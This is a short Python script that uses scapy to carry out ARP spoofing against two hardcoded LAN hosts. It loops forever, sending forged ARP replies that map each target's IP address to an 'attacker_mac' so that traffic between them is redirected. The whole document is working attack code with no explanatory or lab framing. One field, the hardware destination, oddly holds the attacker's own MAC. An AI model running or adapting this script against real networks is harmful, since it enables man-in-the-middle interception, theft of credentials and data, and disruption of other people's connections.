from scapy.all import ARP, send
import time

target_devices = ["192.168.1.140", "192.168.1.144"]
attacker_mac = "a0:36:bc:bb:59:dc"

def generate_arp_response(ip_target, ip_spoof, mac_target):
    packet = ARP(op=2, psrc=ip_target, pdst=ip_spoof,
    hwdst=mac_target, hwsrc=attacker_mac)
    return packet

def send_packet(packet):
    send(packet, verbose=0)
    
def spoof_target():
    while True:
        for i in range(len(target_devices)):
            for j in range(len(target_devices)):
                if i != j:
                    ip_target = target_devices[i]
                    ip_spoof = target_devices[j]
                    mac_target = attacker_mac
                    packet = generate_arp_response(ip_target, ip_spoof, mac_target)
                    send_packet(packet)
                    time.sleep(1)
                
spoof_target()